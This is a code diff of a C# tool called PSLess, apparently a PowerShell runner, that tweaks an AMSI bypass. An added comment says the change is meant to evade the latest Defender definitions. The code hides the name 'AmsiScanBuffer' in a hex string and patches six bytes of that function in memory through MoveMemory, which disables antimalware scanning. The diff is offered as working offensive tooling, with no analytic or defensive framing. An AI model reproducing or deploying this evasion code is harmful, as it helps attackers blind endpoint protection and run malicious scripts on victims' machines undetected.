@@ -1,3 +1,5 @@
+//2019-04-13 addded quick&dirty fix in order to bypass latest Defender definitions and new AMSI bypass
+//https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/master/ASBBypass/Program.cs
 using System.Collections.ObjectModel;
 using System.Management.Automation;
 using System.Management.Automation.Runspaces;
@@ -19,13 +21,14 @@ namespace PSLess
         [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
         static extern void MoveMemory(IntPtr dest, IntPtr src, int size);
       
-        //https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/master/ASBBypass/Program.cs
-       public static int Disable()
-        {
+       
+	
+         public static int Disable()
+          {
             string hexbuffer = "41 6d 73 69 53 63 61 6e 42 75 66 66 65 72";
-			string buffer="";
-			string[] hexbuffersplit = hexbuffer.Split(' ');
-			foreach (String hex in hexbuffersplit)
+	    string buffer="";
+	    string[] hexbuffersplit = hexbuffer.Split(' ');
+	    foreach (String hex in hexbuffersplit)
             {
                
                 int value = Convert.ToInt32(hex, 16);
@@ -46,7 +49,7 @@ namespace PSLess
             MoveMemory(Address, unmanagedPointer, 6);
 
             return 0;
-        } 
+          } 
        static void Main(string[] args)
         {
             if (args.Length == 0)
